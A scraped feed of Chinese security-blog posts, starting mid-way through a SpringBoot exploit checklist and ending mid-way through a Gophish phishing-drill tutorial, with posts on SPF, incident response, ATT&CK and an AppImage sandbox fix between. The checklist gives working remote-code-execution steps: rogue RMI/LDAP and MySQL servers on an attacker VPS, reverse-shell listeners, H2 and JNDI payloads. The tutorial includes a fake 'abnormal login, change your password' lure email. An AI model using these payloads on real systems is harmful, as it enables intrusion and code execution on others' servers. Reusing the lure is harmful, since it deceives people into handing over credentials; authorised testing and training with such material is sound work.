 直接访问可触发漏洞的 URL，相当于通过 jolokia 调用 ch.qos.logback.classic.jmx.JMXConfigurator 类的 reloadByURL 方法 目标机器请求外部日志配置文件 URL 地址，获得恶意 xml 文件内容 目标机器使用 saxParser.parse 解析 xml 文件 (这里导致了 xxe 漏洞) xml 文件中利用 logback 依赖的 insertFormJNDI 标签，设置了外部 JNDI 服务器地址 目标机器请求恶意 JNDI 服务器，导致 JNDI 注入，造成 RCE 漏洞  漏洞分析： spring boot actuator rce via jolokia\n漏洞环境： repository/springboot-jolokia-logback-rce\n正常访问：\nhttp://127.0.0.1:9094/env  0x05：jolokia Realm JNDI RCE 利用条件：  目标网站存在 /jolokia 或 /actuator/jolokia 接口 目标使用了 jolokia-core 依赖（版本要求暂未知）并且环境中存在相关 MBean 目标可以请求攻击者的服务器（请求可出外网） JNDI 注入受目标 JDK 版本影响，jdk \u0026lt; 6u141/7u131/8u121（RMI 方式）  利用方法： 步骤一：查看已存在的 MBeans 访问 /jolokia/list 接口，查看是否存在 type=MBeanFactory 和 createJNDIRealm 关键词。\n步骤二：准备要执行的 Java 代码 编写优化过后的用来反弹 shell 的 Java 示例代码 JNDIObject.java。\n步骤三：托管 class 文件 在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）\n# 使用 python 快速开启 http server python2 -m SimpleHTTPServer 80 python3 -m http.server 80  将步骤二中编译好的 class 文件拷贝到 HTTP 服务器根目录。\n步骤四：架设恶意 rmi 服务 下载 marshalsec ，使用下面命令架设对应的 rmi 服务：\njava -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://your-vps-ip:80/#JNDIObject 1389  步骤五：监听反弹 shell 的端口 一般使用 nc 监听端口，等待反弹 shell\nnc -lvp 443  步骤六：发送恶意 payload 根据实际情况修改 springboot-realm-jndi-rce.py 脚本中的目标地址，RMI 地址、端口等信息，然后在自己控制的服务器上运行。\n漏洞原理：  利用 jolokia 调用 createJNDIRealm 创建 JNDIRealm 设置 connectionURL 地址为 RMI Service URL 设置 contextFactory 为 RegistryContextFactory 停止 Realm 启动 Realm 以触发指定 RMI 地址的 JNDI 注入，造成 RCE 漏洞  漏洞分析： Yet Another Way to Exploit Spring Boot Actuators via Jolokia\n漏洞环境： repository/springboot-jolokia-logback-rce\n正常访问：\nhttp://127.0.0.1:9094/env  0x06：h2 database query RCE 利用条件：  可以 POST 请求目标网站的 /env 接口设置属性 可以 POST 请求目标网站的 /restart 接口重启应用（存在 spring-boot-starter-actuator 依赖） 存在 com.h2database.h2 依赖（版本要求暂未知）  利用方法： 步骤一：设置 spring.datasource.hikari.connection-test-query 属性  ⚠️ 下面payload 中的 \u0026lsquo;T5\u0026rsquo; 方法每一次执行命令后都需要更换名称 (如 T6) ，然后才能被重新创建使用，否则下次 restart 重启应用时漏洞不会被触发\n spring 1.x（无回显执行命令）\nPOST /env Content-Type: application/x-www-form-urlencoded spring.datasource.hikari.connection-test-query=CREATE ALIAS T5 AS CONCAT('void ex(String m1,String m2,String m3)throws Exception{Runti','me.getRun','time().exe','c(new String[]{m1,m2,m3});}');CALL T5('cmd','/c','calc');  spring 2.x（无回显执行命令）\nPOST /actuator/env Content-Type: application/json {\u0026quot;name\u0026quot;:\u0026quot;spring.datasource.hikari.connection-test-query\u0026quot;,\u0026quot;value\u0026quot;:\u0026quot;CREATE ALIAS T5 AS CONCAT('void ex(String m1,String m2,String m3)throws Exception{Runti','me.getRun','time().exe','c(new String[]{m1,m2,m3});}');CALL T5('cmd','/c','calc');\u0026quot;}  步骤二：重启应用 spring 1.x\nPOST /restart Content-Type: application/x-www-form-urlencoded  spring 2.x\nPOST /actuator/restart Content-Type: application/json  漏洞原理：  spring.datasource.hikari.connection-test-query 属性被设置为一条恶意的 CREATE ALIAS 创建自定义函数的 SQL 语句 其属性对应 HikariCP 数据库连接池的 connectionTestQuery 配置，定义一个新数据库连接之前被执行的 SQL 语句 restart 重启应用，会建立新的数据库连接 如果 SQL 语句中的自定义函数还没有被执行过，那么自定义函数就会被执行，造成 RCE 漏洞  漏洞分析： remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database\n漏洞环境： repository/springboot-h2-database-rce\n正常访问：\nhttp://127.0.0.1:9096/actuator/env  0x07：h2 database console JNDI RCE 利用条件：  存在 com.h2database.h2 依赖（版本要求暂未知） spring 配置中启用 h2 console spring.h2.console.enabled=true 目标可以请求攻击者的服务器（请求可出外网） JNDI 注入受目标 JDK 版本影响，jdk \u0026lt; 6u201/7u191/8u182/11.0.1（LDAP 方式）  利用方法： 步骤一：访问路由获得 jsessionid 直接访问目标开启 h2 console 的默认路由 /h2-console，目标会跳转到页面 /h2-console/login.jsp?jsessionid=xxxxxx，记录下实际的 jsessionid=xxxxxx 值。\n步骤二：准备要执行的 Java 代码 编写优化过后的用来反弹 shell 的 Java 示例代码 JNDIObject.java，\n使用兼容低版本 jdk 的方式编译：\njavac -source 1.5 -target 1.5 JNDIObject.java  然后将生成的 JNDIObject.class 文件拷贝到 步骤二 中的网站根目录。\n步骤三：托管 class 文件 在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）\n# 使用 python 快速开启 http server python2 -m SimpleHTTPServer 80 python3 -m http.server 80  将步骤二中编译好的 class 文件拷贝到 HTTP 服务器根目录。\n步骤四：架设恶意 ldap 服务 下载 marshalsec ，使用下面命令架设对应的 ldap 服务：\njava -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://your-vps-ip:80/#JNDIObject 1389  步骤五：监听反弹 shell 的端口 一般使用 nc 监听端口，等待反弹 shell\nnc -lv 443  步骤六：发包触发 JNDI 注入 根据实际情况，替换下面数据中的 jsessionid=xxxxxx、www.example.com 和 ldap://your-vps-ip:1389/JNDIObject\nPOST /h2-console/login.do?jsessionid=xxxxxx Host: www.example.com Content-Type: application/x-www-form-urlencoded Referer: http://www.example.com/h2-console/login.jsp?jsessionid=xxxxxx language=en\u0026amp;setting=Generic+H2+%28Embedded%29\u0026amp;name=Generic+H2+%28Embedded%29\u0026amp;driver=javax.naming.InitialContext\u0026amp;url=ldap://your-vps-ip:1389/JNDIObject\u0026amp;user=\u0026amp;password=  漏洞分析： Spring Boot + H2数据库JNDI注入\n漏洞环境： repository/springboot-h2-database-rce\n正常访问：\nhttp://127.0.0.1:9096/h2-console  0x08：mysql jdbc deserialization RCE 利用条件：  可以 POST 请求目标网站的 /env 接口设置属性 可以 POST 请求目标网站的 /refresh 接口刷新配置（存在 spring-boot-starter-actuator 依赖） 目标环境中存在 mysql-connector-java 依赖 目标可以请求攻击者的服务器（请求可出外网）  利用方法： 步骤一：查看环境依赖 GET 请求 /env 或 /actuator/env，搜索环境变量（classpath）中是否有 mysql-connector-java 关键词，并记录下其版本号（5.x 或 8.x）；\n搜索并观察环境变量中是否存在常见的反序列化 gadget 依赖，比如 commons-collections、Jdk7u21、Jdk8u20 等；\n搜索 spring.datasource.url 关键词，记录下其 value 值，方便后续恢复其正常 jdbc url 值。\n步骤二：架设恶意 rogue mysql server 在自己控制的服务器上运行 springboot-jdbc-deserialization-rce.py 脚本，并使用 ysoserial 自定义要执行的命令：\njava -jar ysoserial.jar CommonsCollections3 calc \u0026gt; payload.ser  在脚本同目录下生成 payload.ser 反序列化 payload 文件，供脚本使用。\n步骤三：设置 spring.datasource.url 属性  ⚠️ 修改此属性会暂时导致网站所有的正常数据库服务不可用，会对业务造成影响，请谨慎操作！\n mysql-connector-java 5.x 版本设置属性值为：\njdbc:mysql://your-vps-ip:3306/mysql?characterEncoding=utf8\u0026amp;useSSL=false\u0026amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\u0026amp;autoDeserialize=true  mysql-connector-java 8.x 版本设置属性值为：\njdbc:mysql://your-vps-ip:3306/mysql?characterEncoding=utf8\u0026amp;useSSL=false\u0026amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor\u0026amp;autoDeserialize=true  spring 1.x\nPOST /env Content-Type: application/x-www-form-urlencoded spring.datasource.url=对应属性值  spring 2.x\nPOST /actuator/env Content-Type: application/json {\u0026quot;name\u0026quot;:\u0026quot;spring.datasource.url\u0026quot;,\u0026quot;value\u0026quot;:\u0026quot;对应属性值\u0026quot;}  步骤四：刷新配置 spring 1.x\nPOST /refresh Content-Type: application/x-www-form-urlencoded  spring 2.x\nPOST /actuator/refresh Content-Type: application/json  步骤五：触发数据库查询 尝试访问网站已知的数据库查询的接口，例如： /product/list ，或者寻找其他方式，主动触发源网站进行数据库查询，然后漏洞会被触发\n步骤六：恢复正常 jdbc url 反序列化漏洞利用完成后，使用 步骤三 的方法恢复 步骤一 中记录的 spring.datasource.url 的原始 value 值\n漏洞原理：  spring.datasource.url 属性被设置为外部恶意 mysql jdbc url 地址 refresh 刷新后设置了一个新的 spring.datasource.url 属性值 当网站进行数据库查询等操作时，会尝试使用恶意 mysql jdbc url 建立新的数据库连接 然后恶意 mysql server 就会在建立连接的合适阶段返回反序列化 payload 数据 目标依赖的 mysql-connector-java 就会反序列化设置好的 gadget，造成 RCE 漏洞  漏洞分析： New-Exploit-Technique-In-Java-Deserialization-Attack\n漏洞环境：  需要配置 application.properties 中的 spring.datasource.url、spring.datasource.username、spring.datasource.password，保证可以正常连上 mysql 数据库，否则程序启动时就会报错退出\n repository/springboot-mysql-jdbc-rce\n正常访问：\nhttp://127.0.0.1:9097/actuator/env  发送完 payload 后触发漏洞：\nhttp://127.0.0.1:9097/product/list    作者：LandGrey\n来源：https://github.com/LandGrey/SpringBootVulExploit\n","date":"2020-08-04","permalink":"https://xeye.io/post/springboot%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8checklist/","tags":["红队"],"title":"SpringBoot 相关漏洞利用 CheckList"},{"content":"问题产生 我遇到的情况是在安装网易云音乐Linux版和PicGo图床的时候，打开无反应，后来使用命令行运行，出现了下面的报错信息：\npicgo：\n[8898:0420/011642.495795:FATAL:setuid_sandbox_host.cc(157)] The SUID sandbox helper binary was found, but is not configured correctly. Rather than run without sandboxing I'm aborting now. You need to make sure that /tmp/.mount_PicGo-s7aX7M/chrome-sandbox is owned by root and has mode 4755. 1  部分解决 后来网易云音乐的问题成功解决了，只要将给出的chrome-sandbox文件给予root用户并赋予4755权限，然后重新打开安装即可。\nsudo chown root \u0026lt;path_to_marktext_dir\u0026gt;/chrome-sandbox \u0026amp;\u0026amp; sudo chmod 4755 \u0026lt;path_to_marktext_dir\u0026gt;/chrome-sandbox 1  其中\u0026lt;path_to_marktext_dir\u0026gt;即报错信息中给出的chrome-sandbox文件位置，在上面的报错信息中为/tmp/.mount_PicGo-s7aX7M/chrome-sandbox。\n但这并不能解决PicGo的问题，因为PicGo的AppImage如果执行不成功，会自动将chrome-sandbox文件删除，并且第二次产生的文件夹名称会发生改变，因为完全无法进行授权操作。\n后来去找了很多资料，确定该问题为使用Electron给软件打包时产生的错误，是Linux内核的user_namespaces没有自动打开的问题。\n解决方案 解决的办法有四种，我最推荐第四种解决方法，一劳永逸。\n 启用用户名称空间： sudo sysctl kernel.unprivileged_userns_clone=1，但每次开机都要运行该命令。 给报错信息给出的文件授权：sudo chown root /chrome-sandbox \u0026amp;\u0026amp; sudo chmod 4755 /chrome-sandbox，即解决网易云音乐该问题时的操作，但不适用于picgo。 运行的时候加上免沙箱命令：--no-sandbox 开机时自启动用户名称空间：echo 'kernel.unprivileged_userns_clone=1' \u0026gt; /etc/sysctl.d/userns.conf  该命令只适用于Debian/Ubuntu系列Linux发行版，未测试其他发行版。\n 文章来源：\nhttps://blog.csdn.net/qq_42239554/article/details/105640909\n","date":"2020-08-03","permalink":"https://xeye.io/post/%E8%A7%A3%E5%86%B3debian%E6%89%93%E5%BC%80pigo.appimage%E6%8A%A5%E9%94%99%E9%97%AE%E9%A2%98/","tags":null,"title":"解决debian打开PiGo.appimage报错问题"},{"content":"SPF，全称为 Sender Policy Framework，即发件人策略框架。\n当前 Email 通信，还是在使用 SMTP 这个协议。SMTP 的全称为 Simple Mail Transfer Protocol，即「简单邮件传输协议」。正如它的名字锁暗示的，SMTP 实际上是一个非常简单（甚至简陋）的传输协议，本身并没有很好的安全措施。根据 SMTP 的规则，发件人的邮箱地址是可以由发信方任意声明的。在 SMTP 协议制定的时候也许还好，但在垃圾和诈骗邮件横行的今天，这显然是极不安全的。\nSPF 出现的目的，就是为了防止随意伪造发件人。\nSPF 记录的原理 SPF 记录实际上是服务器的一个 DNS 记录，原理其实很简单：\n假设邮件服务器收到了一封邮件，来自主机的 IP 是173.194.72.103，并且声称发件人为email@example.com。为了确认发件人不是伪造的，邮件服务器会去查询example.com的 SPF 记录。如果该域的 SPF 记录设置允许 IP 为173.194.72.103的主机发送邮件，则服务器就认为这封邮件是合法的；如果不允许，则通常会退信，或将其标记为垃圾/仿冒邮件。\n因为不怀好心的人虽然可以「声称」他的邮件来自example.com，但是他却无权操作example.com的 DNS 记录；同时他也无法伪造自己的 IP 地址。因此 SPF 是很有效的，当前基本上所有的邮件服务提供商（例如 Gmail、QQ 邮箱等）都会验证它。\nSPF 记录的语法 一条 SPF 记录定义了一个或者多个 mechanism，而 mechanism 则定义了哪些 IP 是允许的，哪些 IP 是拒绝的。\n这些 mechanism 包括以下几类：\nall | ip4 | ip6 | a | mx | ptr | exists | include  每个 mechanism 可以有四种前缀：\n\u0026quot;+\u0026quot; Pass（通过） \u0026quot;-\u0026quot; Fail（拒绝） \u0026quot;~\u0026quot; Soft Fail（软拒绝） \u0026quot;?\u0026quot; Neutral（中立）  测试时，将从前往后依次测试每个 mechanism。如果一个 mechanism 包含了要查询的 IP 地址（称为命中），则测试结果由相应 mechanism 的前缀决定。默认的前缀为+。如果测试完所有的 mechanisms 也没有命中，则结果为 Neutral。\n除了以上四种情况，还有 None（无结果）、PermError（永久错误）和 TempError（临时错误）三种其他情况。对于这些情况的解释和服务器通常的处理办法如下：\n   结果 含义 服务器处理办法     Pass 发件 IP 是合法的 接受来信   Fail 发件 IP 是非法的 退信   Soft Fail 发件 IP 非法，但是不采取强硬措施 接受来信，但是做标记   Neutral SPF 记录中没有关于发件 IP 是否合法的信息 接受来信   None 服务器没有设定 SPF 记录 接受来信   PermError 发生了严重错误（例如 SPF 记录语法错误） 没有规定   TempError 发生了临时错误（例如 DNS 查询失败） 接受或拒绝    注意，上面所说的「服务器处理办法」仅仅是 SPF 标准做出的建议，并非所有的邮件服务器都严格遵循这套规定。\nMechanisms 下面介绍上面提到的 mechanism：\nall 表示所有 IP，肯定会命中。因此通常把它放在 SPF 记录的结尾，表示处理剩下的所有情况。例如：\n\u0026quot;v=spf1 -all\u0026quot; 拒绝所有（表示这个域名不会发出邮件） \u0026quot;v=spf1 +all\u0026quot; 接受所有（域名所有者认为 SPF 是没有用的，或者根本不在乎它）  ip4 格式为ip4:\u0026lt;ip4-address\u0026gt;或者ip4:\u0026lt;ip4-network\u0026gt;/\u0026lt;prefix-length\u0026gt;，指定一个 IPv4 地址或者地址段。如果prefix-length没有给出，则默认为/32。例如：\n\u0026quot;v=spf1 ip4:192.168.0.1/16 -all\u0026quot; 只允许在 192.168.0.1 ~ 192.168.255.255 范围内的 IP  ip6 格式和ip4的很类似，默认的prefix-length是/128。例如：\n\u0026quot;v=spf1 ip6:1080::8:800:200C:417A/96 -all\u0026quot; 只允许在 1080::8:800:0000:0000 ~ 1080::8:800:FFFF:FFFF 范围内的 IP  a 和 mx 这俩的格式是相同的，以a为例，格式为以下四种之一：\na a/\u0026lt;prefix-length\u0026gt; a:\u0026lt;domain\u0026gt; a:\u0026lt;domain\u0026gt;/\u0026lt;prefix-length\u0026gt;  会命中相应域名的 a 记录（或 mx 记录）中包含的 IP 地址（或地址段）。如果没有提供域名，则使用当前域名。例如：\n\u0026quot;v=spf1 mx -all\u0026quot; 允许当前域名的 mx 记录对应的 IP 地址。 \u0026quot;v=spf1 mx mx:deferrals.example.com -all\u0026quot; 允许当前域名和 deferrals.example.com 的 mx 记录对应的 IP 地址。 \u0026quot;v=spf1 a/24 -all\u0026quot; 类似地，这个用法则允许一个地址段。  例如，这是一个比较常见的 SPF 记录，它表示支持当前域名的 a 记录和 mx 记录，同时支持一个给定的 IP 地址；其他地址则拒绝：\nv=spf1 a mx ip4:173.194.72.103 -all  include 格式为include:\u0026lt;domain\u0026gt;，表示引入\u0026lt;domain\u0026gt;域名下的 SPF 记录。注意，如果该域名下不存在 SPF 记录，则会导致一个PermError结果。例如：\n\u0026quot;v=spf1 include:example.com -all\u0026quot; 即采用和 example.com 完全一样的 SPF 记录  exists 格式为exists:\u0026lt;domain\u0026gt;。将对\u0026lt;domain\u0026gt;执行一个 A 查询，如果有返回结果（无论结果是什么），都会看作命中。\nptr 格式为ptr或者ptr:\u0026lt;domain\u0026gt;。使用ptr机制会带来大量很大开销的 DNS 查询，所以连官方都不推荐使用它。\n关于v=spf1 这是必须的，这个表示采用 SPF 1 版本，现在它的最新版本就是第 1 版。\nModifiers SPF 记录中还可以包括两种可选的 modifier；一个 modifier 只能出现一次。\nredirect 格式为redirect=\u0026lt;domain\u0026gt;\n将用给定域名的 SPF 记录替换当前记录。\nexp 格式为exp=\u0026lt;domain\u0026gt;，目的是如果邮件被拒绝，可以给出一个消息。而消息的具体内容会首先对\u0026lt;domain\u0026gt;执行 TXT 查询，然后执行宏扩展得到。\n如何用 SPF 保护我的域名 如果你拥有自己的域名，并且用它发送邮件，那么你应该为它添加 SPF。通过域名服务商提供的「域名解析」、「DNS Editor」或者「DNS Zone Editor」等功能添加，并填写正确的 SPF 数据就可以了。\n严格来说，SPF 数据应该创建为 SPF 记录。但是鉴于很多 DNS 服务商不支持 SPF 记录，甚至有的邮件服务器也不支持 SPF 记录，因此也可以创建为一条 TXT 记录。目前，你应该至少创建一条 TXT 记录。\n因为本质上 SPF 的作用是为一个域名指定合法的发件 IP，所以你需要知道自己使用的邮件服务器的发件 IP 是什么。如果你使用第三方的域名邮箱服务（比如腾讯的域名邮箱），那么他们应该有相应的文档告诉你该怎么填写。如果你用虚拟主机，则主机提供商也应该会告诉你。\n生效时间 SPF 记录本质上是一个 DNS 记录，所以并不是修改之后立即生效的——通常需要几个小时的时间。\n一些工具 虽然我不能帮你决定 SPF 该填什么，但是这里有一些非常好用的工具可以帮助你，点击它们在新窗口打开：\n Open SPF：官方网站，有很多资料，值得一看。 RFC 4408：SPFv1 的规范全文。 SPF Recored Testing Tools：帮助你验证域名是否存在 SPF 记录、记录的语法是否正确，以及输入 IP 和 host 来测试是不是真正管用。 SPF: Why?：为什么我发的邮件被拒绝了？ Beveridge Hosting DNS Lookup：图形界面的dig，也可以显示查询到的 SPF 信息。 Beveridge SPF Test：另一个根据 IP 和 host 验证 SPF 是否通过的工具。 Gmail：如果你有 Gmail 的话，可以给自己的 Gmail 邮箱发一封邮件，然后用 Gmail 独有的 Show Original 功能查看 Gmail 服务器的 SPF 判断结果。    作者：Renfei\n转载来源：http://www.renfei.org/blog/introduction-to-spf.html\n","date":"2020-07-31","permalink":"https://xeye.io/post/spf%E8%AE%B0%E5%BD%95%E5%8E%9F%E7%90%86%E8%AF%AD%E6%B3%95%E5%8F%8A%E9%85%8D%E7%BD%AE%E6%96%B9%E6%B3%95%E7%AE%80%E4%BB%8B/","tags":["SPF"],"title":"SPF记录：原理、语法及配置方法简介"},{"content":"这是一个关于安全事件应急响应的项目，从系统入侵到事件处理，收集和整理了一些案例进行分析，覆盖Windows、Linux平台，涵盖勒索病毒自救、日志分析、后门排查、挖矿后门等、搜索引擎劫持等内容，甲方信息安全工程师必备指南。\n项目目录  [第一章：入侵排查篇]  第1篇：Window入侵排查 第2篇：Linux入侵排查 第3篇：常见的Webshell查杀工具 第4篇：如何发现隐藏的Webshell后门 第5篇：勒索病毒自救指南   [第二章：日志分析篇]  第1篇:Window日志分析 第2篇:Linux日志分析 第3篇:Web日志分析 第4篇:MSSQL日志分析 第5篇:MySQL日志分析   [第三章：权限维持篇]  第1篇：Windows权限维持\u0026ndash;隐藏篇 第2篇：Windows权限维持\u0026ndash;后门篇 第3篇：Linux权限维持\u0026ndash;隐藏篇 第4篇：Linux权限维持\u0026ndash;后门篇 第5篇：Windows命令行文件下载方式汇总 第6篇：三大渗透测试框架权限维持技术 第7篇：常见WebShell管理工具   [第四章:Windows实战篇]  第1篇：FTP暴力破解 第2篇：蠕虫病毒 第3篇：勒索病毒 第4篇：ARP病毒 第5篇：挖矿病毒（一） 第6篇：挖矿病毒（二）   [第五章：Linux实战篇]  第1篇：SSH暴力破解 第2篇：捕捉短连接 第3篇：挖矿病毒 第4篇：盖茨木马 第5篇：DDOS病毒 第6篇：Shell病毒   [第六章：Web实战篇]  第1篇：网站被植入Webshell 第2篇：门罗币恶意挖矿 第3篇：批量挂黑页 第4篇：新闻源网站劫持 第5篇：移动端劫持 第6篇：搜索引擎劫持 第7篇：网站首页被篡改 第8篇：管理员账号被篡改 第9篇：编辑器入侵事件     PDF文档下载：https://xeye.io/static/images/20200729094845.pdf\nGitHub 地址：https://github.com/Bypass007/Emergency-Response-Notes\nGitBook 地址：https://bypass007.github.io/Emergency-Response-Notes/\n","date":"2020-07-29","permalink":"https://xeye.io/post/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%AE%9E%E6%88%98%E7%AC%94%E8%AE%B0/","tags":["蓝队"],"title":"应急响应实战笔记"},{"content":"ATT\u0026amp;CK，全称是Adversarial Tactics, Techniques, and Common Knowledges。A是Adversarial，表示攻击者、对手；两个T分別是Tactics和Technical，即战术和技术；CK是Common knowledge，通用知识库。这是一套反应各个攻击生命周期攻击行为的模型和知识库。\nATT\u0026amp;CK模型分为三部分，分别是PRE-ATT\u0026amp;CK，ATT\u0026amp;CK for Enterprise和ATT\u0026amp;CK for Mobile。\nATT\u0026amp;CK 矩阵知识库，总结了网络攻击手法和案例，对攻击手法和防御做了通用的分类。将网络攻击生命周期拆分为12个阶段，每个阶段细分各类攻击手法和防御策略，ATT\u0026amp;CK框架对研究APT组织攻击手法和检测有非常大的落地指导意义。红蓝队都可以借鉴这个矩阵图，按照网络杀伤链来结合自身安全产品来制定攻防策略。\ngraph LR; 1.初始访问 --\u0026gt; 2.执行攻击 --\u0026gt; 3.持久化控制 --\u0026gt; 4.提升特权 --\u0026gt; 5.规避防御 --\u0026gt; 6.凭据访问 --\u0026gt; 7.探索发现 --\u0026gt; 8.横向移动 --\u0026gt; 9.搜集信息 --\u0026gt; 10.命令与控制 --\u0026gt; 11.窃取数据 --\u0026gt; 12.危害影响  附一张旧版的翻译图：\n 原版xlsx下载地址（PRE-ATT\u0026amp;CK，ATT\u0026amp;CK for Enterprise）：\nhttps://xeye.io/static/images/20200728135237.xlsx\nATT\u0026amp;CK for Enterprise在线导航：\nhttps://mitre-attack.github.io/attack-navigator/enterprise/\n中文翻译版（旧）：\nhttp://vulhub.org.cn/attack\n参考文章：\n从ATT\u0026amp;CK看威胁情报的发展和应用趋势\nhttps://www.secrss.com/articles/13058\n","date":"2020-07-28","permalink":"https://xeye.io/post/attck%E7%9F%A9%E9%98%B5%E5%9B%BE-%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91/","tags":["红队"],"title":"ATT\u0026CK for Enterprise-中文翻译"},{"content":"Cobalt Strike 是一个为对手模拟和红队行动而设计的平台，主要用于执行有目地的攻击和模拟高级威胁者的后渗透行动。\n文档由Snowming@ QAX A-TEAM翻译。\n章节 第一章 欢迎来到Cobalt Strike的世界 第二章 用户接口 第三章 数据管理 第四章 监听器和基础设施管理 第五章 获取立足点 第六章 Payload Artifact和反病毒规避 第七章 后渗透 第八章 Browser Pivoting 第九章 Pivoting 第十章 SSH 会话 第十一章 C2拓展文件 第十二章 可扩展PE，进程注入和后渗透 第十三章 报告和日志  PDF下载地址：\nhttps://xeye.io/static/images/20200727091140.pdf\n原文链接：\nhttps://blog.ateam.qianxin.com/post/cobalt-strike-40-shou-ce-fan-yi-2019-nian-12-yue-2-ri-geng-xin-ban-ben/\n","date":"2020-07-27","permalink":"https://xeye.io/post/cobalt-strike-4.0%E4%B8%AD%E6%96%87%E6%89%8B%E5%86%8C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%BA%BA%E5%91%98%E7%9A%84%E5%85%88%E8%BF%9B%E5%A8%81%E8%83%81%E6%88%98%E6%9C%AF%E5%AE%9D%E5%85%B8/","tags":["红队"],"title":"Cobalt Strike 4.0中文手册：渗透测试人员的先进威胁战术宝典"},{"content":" 理论篇 技术篇 实践篇  ","date":"2020-07-23","permalink":"https://xeye.io/post/%E4%BA%92%E8%81%94%E7%BD%91%E4%BC%81%E4%B8%9A%E5%AE%89%E5%85%A8%E9%AB%98%E7%BA%A7%E6%8C%87%E5%8D%97%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/","tags":["安全建设"],"title":"《互联网企业安全高级指南》思维导图"},{"content":"一、准备工作 Gophish是一个开源网络钓鱼工具包\n特点是开箱即用，特别适合甲方用来对内部员工进行邮件钓鱼演练。\n项目主页：https://getgophish.com/\n1、安装 支持Windows/ Mac/Linux平台。下载对应系统版本（https://github.com/gophish/gophish/releases/）的压缩包，运行二进制文件即可。\n2、编译安装  Gophish编译安装需要Go v1.10或更高版本！\n go get github.com/gophish/gophish cd ~/.go/src/github.com/gophish/gophish/ [你本机的go项目目录] go build ./gophish [运行生成的gophish二进制文件，浏览器访问即可] https://localhost:3333 [默认用户admin，密码在终端生成]  3、Docker https://hub.docker.com/r/gophish/gophish/\n4、项目文档 http://getgophish.com/documentation\n5、问题反馈 https://github.com/gophish/gophish/issues/new\n6、免费SSL证书 示例域名： https://access.a.com 安装ssl证书（letsencrypt）： cd /opt/gophish # 你的gophish目录 sudo apt install certbot sudo kill $(pidof gohpish) sudo certbot certonly -d access.a.com --standalone ln -s /etc/letsencrypt/live/access.a.com/privkey.pem access.a.com.key ln -s /etc/letsencrypt/live/access.a.com/fullchain.pem access.a.com.crt  7、配置文件 # nano config.json { \u0026quot;admin_server\u0026quot;: { \u0026quot;listen_url\u0026quot;: \u0026quot;0.0.0.0:8088\u0026quot;, //修改默认端口 \u0026quot;use_tls\u0026quot;: true, \u0026quot;cert_path\u0026quot;: \u0026quot;gophish_admin.crt\u0026quot;, \u0026quot;key_path\u0026quot;: \u0026quot;gophish_admin.key\u0026quot; }, \u0026quot;phish_server\u0026quot;: { \u0026quot;listen_url\u0026quot;: \u0026quot;0.0.0.0:443\u0026quot;, //https开启443端口 \u0026quot;use_tls\u0026quot;: true, \u0026quot;cert_path\u0026quot;: \u0026quot;access.a.com.crt\u0026quot;, //修改证书 \u0026quot;key_path\u0026quot;: \u0026quot;access.a.com.key\u0026quot; //修改证书 }, \u0026quot;db_name\u0026quot;: \u0026quot;sqlite3\u0026quot;, //数据库支持MySQL \u0026quot;db_path\u0026quot;: \u0026quot;gophish.db\u0026quot;, \u0026quot;migrations_prefix\u0026quot;: \u0026quot;db/db_\u0026quot;, \u0026quot;contact_address\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;logging\u0026quot;: { \u0026quot;filename\u0026quot;: \u0026quot;/var/log/gophish/gophish.log\u0026quot;, //日志记录，需要先创建目录和文件，否则跑不起来 \u0026quot;level\u0026quot;: \u0026quot;\u0026quot; } }  二、目标人群 \n模板案例，名字我只用FirstName，后面邮件内容模板用到这个变量FirstName\n\n 三、邮件内容模板  用户名处插入变量：{{.FirstName}}，程序发送邮件的时候会自动插入对应的用户名。\n \n\u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;\u0026lt;font style=\u0026quot;vertical-align: inherit;\u0026quot;\u0026gt;\u0026lt;font style=\u0026quot;vertical-align: inherit;\u0026quot;\u0026gt;\u0026lt;font style=\u0026quot;vertical-align: inherit;\u0026quot;\u0026gt;\u0026lt;font style=\u0026quot;vertical-align: inherit;\u0026quot;\u0026gt;\u0026lt;font style=\u0026quot;vertical-align: inherit;\u0026quot;\u0026gt;\u0026lt;font style=\u0026quot;vertical-align: inherit;\u0026quot;\u0026gt;您的ucenter帐户：{{.FirstName}}\u0026lt;/font\u0026gt;\u0026lt;/font\u0026gt;\u0026lt;/font\u0026gt;\u0026lt;/font\u0026gt;\u0026lt;/font\u0026gt;\u0026lt;/font\u0026gt;\u0026amp;nbsp;出现异常登陆\u0026lt;font style=\u0026quot;vertical-align: inherit;\u0026quot;\u0026gt;\u0026lt;font style=\u0026quot;vertical-align: inherit;\u0026quot;\u0026gt;\u0026lt;font style=\u0026quot;vertical-align: inherit;\u0026quot;\u0026gt;\u0026lt;font style=\u0026quot;vertical-align: inherit;\u0026quot;\u0026gt;\u0026lt;font style=\u0026quot;vertical-align: inherit;\u0026quot;\u0026gt;\u0026lt;font style=\u0026quot;vertical-align: inherit;\u0026quot;\u0026gt;，请您立即修改ucenter帐户密码，否则账户将被禁止使用。\u0026lt;/font\u0026gt;\u0026lt;/font\u0026gt;\u0026lt;/font\u0026gt;\u0026lt;/font\u0026gt;\u0026lt;/font\u0026gt;\u0026lt;/font\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;\u0026amp;nbsp;\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;\u0026lt;font style=\u0026quot;vertical-align: inherit;\u0026quot;\u0026gt;\u0026lt;font style=\u0026quot;vertical-align: inherit;\u0026quot;\u0026gt;\u0026lt;font style=\u0026quot;vertical-align: inherit;\u0026quot;\u0026gt;\u0026lt;font 